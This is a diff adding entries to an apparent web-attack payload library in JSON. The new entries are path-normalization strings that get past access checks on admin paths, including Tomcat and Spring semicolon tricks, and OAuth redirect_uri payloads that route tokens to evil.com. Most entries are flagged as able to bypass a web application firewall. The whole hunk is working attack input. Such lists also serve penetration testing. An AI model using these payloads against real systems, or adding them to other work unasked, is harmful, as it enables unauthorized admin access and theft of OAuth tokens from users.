@@ -57,6 +57,32 @@
         {"payload": "_method=PUT", "description": "PUT method via _method POST parameter", "waf_bypass": false},
         {"payload": "?_method=DELETE", "description": "Query string _method for method override", "waf_bypass": false}
       ]
+    },
+    "path_normalization": {
+      "description": "Auth bypass via URL path normalization differences between proxy/WAF and application",
+      "payloads": [
+        {"payload": "/admin/./", "description": "Dot segment normalization bypass", "waf_bypass": true},
+        {"payload": "//admin", "description": "Double slash prefix bypass", "waf_bypass": true},
+        {"payload": "/;/admin", "description": "Tomcat path parameter bypass", "waf_bypass": true},
+        {"payload": "/admin..;/", "description": "Tomcat/Spring dotdot-semicolon bypass", "waf_bypass": true},
+        {"payload": "/%2fadmin/", "description": "URL-encoded slash bypass", "waf_bypass": true},
+        {"payload": "/ADMIN", "description": "Case sensitivity bypass", "waf_bypass": true},
+        {"payload": "/admin%00", "description": "Null byte path termination", "waf_bypass": true},
+        {"payload": "/admin%20", "description": "Trailing space bypass", "waf_bypass": true},
+        {"payload": "/.;/admin", "description": "Spring Security dot-semicolon bypass", "waf_bypass": true},
+        {"payload": "/admin/../admin/", "description": "Double traversal normalization", "waf_bypass": true}
+      ]
+    },
+    "oauth_bypass": {
+      "description": "OAuth/OIDC flow bypass via redirect_uri manipulation and state parameter abuse",
+      "payloads": [
+        {"payload": "redirect_uri=https://evil.com", "description": "Open redirect in OAuth flow for token theft", "waf_bypass": false},
+        {"payload": "redirect_uri=https://target.com/callback/../../../evil.com", "description": "Path traversal in redirect_uri", "waf_bypass": true},
+        {"payload": "redirect_uri=https://target.com%40evil.com", "description": "URL authority confusion via @ encoding", "waf_bypass": true},
+        {"payload": "redirect_uri=https://evil.com%23.target.com", "description": "Fragment bypass for redirect_uri validation", "waf_bypass": true},
+        {"payload": "response_type=token", "description": "Force implicit flow for token in URL fragment", "waf_bypass": false},
+        {"payload": "state=FIXED_VALUE", "description": "State parameter fixation (CSRF on OAuth)", "waf_bypass": false}
+      ]
     }
   }
 }
